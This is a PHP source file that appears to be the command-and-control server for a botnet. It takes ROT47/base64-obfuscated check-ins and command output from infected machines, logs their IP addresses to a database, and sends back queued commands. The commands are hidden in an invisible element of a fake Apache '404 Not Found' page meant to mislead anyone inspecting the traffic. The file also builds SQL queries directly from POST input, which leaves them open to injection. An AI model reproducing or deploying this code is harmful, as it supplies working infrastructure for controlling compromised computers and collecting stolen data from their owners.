<?php
/*
  Very simple php that reads a command from a file and places it
  in the source for us.
  
  You could use a database, file method, stdin and so on.
  A good example of potential backend would be MonoHard by Carlos Ganoza
  https://code.google.com/p/monohard/ 
  (es)
*/

//added in for tiny bit of obfuscation
//http://gsnedders.com/rot47-with-php
include('./bot/conexion.php');

function str_rot47($str)
{
        return strtr($str, '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~', 'PQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO');
}

function de64($str)
{
	//first we need to decode the 64
	$to47 = base64_decode($str);
	//next we unrot
	return str_rot47($to47);
}

function en64($str)
{
	return base64_encode(str_rot47($str));
}

/*deprecated code
//get CMD from cmd.txt
$myfile = fopen("cmd.txt", "r") or die("unable to open file!");
$cmd = fread($myfile, filesize("cmd.txt"));
fclose($myfile);
*/

/********
* POST data
******/
//un-obfuscated
$F_user = $_POST['user'];
$F_pass = $_POST['pass'];
$idu = isset($_POST['idu'])  ?  $_POST['idu']   :  NULL;

//obfuscated
$p=isset($_POST['p'])  ?  $_POST['p']   :  NULL;
$t=isset($_POST['t'])  ?  $_POST['t']   :  NULL;
$q = isset($_POST['q'])  ?  $_POST['q']   :  NULL;
$c = isset($_POST['c'])  ?  $_POST['c']   :  NULL;

$pc = de64($p);
$time = de64($t);
$comm = de64($c);
$data = de64($q);

/*****
* Send Post DATA to DB
****/
if (strlen($data) > 0)
{
	mysql_query("INSERT INTO output1 VALUES(null, '".$idu."', '".time()."', '".$comm."', '".$data."')");
}

/********
* GET data back to host
******/
$cmd=isset($_GET['cmd'])  ?  $_GET['cmd']   :  NULL;
$cmd2="stop";


$ip=($_SERVER['REMOTE_ADDR']);

$result = mysql_query("SELECT idu,comando FROM bot WHERE idu='".$idu."'");

if($comando="stop");
{
	mysql_query("UPDATE bot SET comando='stop' WHERE idu='".$idu."'");
}
if (mysql_num_rows($result) > 0  ) 
{
	mysql_query("UPDATE bot SET ip='".$ip."', date='".time()."' WHERE idu='".$idu."'");
	while($row = mysql_fetch_array($result))
	{
		$cmd2 = $row['comando'];
		//echo $row['comando'];
	}
}
else 
{
	echo $time;
	mysql_query("INSERT INTO bot VALUES(null, '".$idu."', '".$ip."', '".$pc."', '".time()."','stop', '".$time."')");
		$cmd2 = "stop";
	//echo "stop";
}

$dmc = en64($cmd2);
//echo $dmc;
/*more deprecated stuff
//write to file
echo $str;

$data = str_rot47($str);
$datafile = fopen("login.txt", "a") or die("unable to open file!");
fwrite($datafile, $data);
fwrite($datafile, "\n");
fclose($datafile);
*/

echo "<html><head><title>404 Not Found</title></head><body>";
echo "<h1>Not Found</h1>The requested URL /login.php was not found on this server.";
echo "<hr/>";
//little misdirection.  Remove or change as needed.
echo "<i>Apache/2.2.22 (Win32) Server at localhost Port 80 </i>";
echo "<br/><pre style='visibility:hidden;'>".$dmc."</pre>";
echo "</body></html>";
?>
